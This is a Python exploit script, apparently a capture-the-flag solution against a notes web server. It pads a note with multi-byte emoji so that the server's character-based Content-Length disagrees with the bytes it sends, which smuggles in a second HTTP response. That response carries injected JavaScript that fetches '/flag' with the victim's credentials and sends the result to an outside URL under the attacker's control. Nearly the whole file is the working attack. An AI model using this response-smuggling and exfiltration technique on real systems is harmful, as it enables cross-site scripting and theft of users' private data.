#!/usr/bin/env python3


url = "http://server-url:3100"
self_url = "http://my-url"

def get_payload() -> str:
    script = """<marquee id="title">Fetching flag...</marquee>
<script>
(async () => {{
    // Discard this first request because it will receive the padding at the
    // end of the payload.
    fetch('/flag', {{credentials: 'same-origin'}})

    const res = await fetch('/flag', {{credentials: 'same-origin'}})
    const flag = await res.text()
    fetch('{}/' + encodeURIComponent(flag))
    document.getElementById('title').textContent = 'Pwned'
}})()
</script>
""".format(
        self_url
    )

    payload = f"""HTTP/1.1 200 OK\r
Content-Type: text/html\r
Content-Length: {len(script)}\r
\r
{script}"""

    # p += "A" * 1448 * 200

    """
    len(pre)  # Fake len
    len(payload)  # Real len (ascii)

    len(total) = len(pre) + len(payload)
    pre_nbytes = 4 * len(pre)  # Each UTF-8 char is 4 bytes

    len(total) == pre_nbytes
    len(pre) + len(payload) == 4 * len(pre)
    len(payload) == 3 * len(pre)
    len(pre) = len(payload) // 3

    # Should be on a packet boundary.
    # Might be avoidable by padding with whitespace.
    # Let k be an integer.
    len(pre) + len(payload) = 1448 * k

    # Easy solution
    len(payload) = 1448 * 3
    len(pre) = 1448
    """
    
    payload_len = 1448 * 3
    payload = payload + "Z" * (payload_len - len(payload))
    
    pre = "😍" * (len(payload) // 3)
    

    ans = pre + payload
    
    # len(ans) = 1448 * 4
    i = len(ans)

    # len(ans.encode()) = 1448 * 7
    assert ans.encode()[i : i + 4] == b"HTTP"
    return ans

filepath = './note'
payload = get_payload()
open(filepath, 'w').write(payload)
content = open(filepath, "rb").read()

# notes.py
# self.wfile.write(http_header(content.decode(), 200))
# def http_header(s: str, status_code: int):
# content_length=len(s),
print(len(content.decode()))
# 5792

# notes.py
# for chunk in iter_chunks(content):
# def iter_chunks(xs, n=1448):
# for i in range(0, len(xs), n):
print(len(content))
# 10136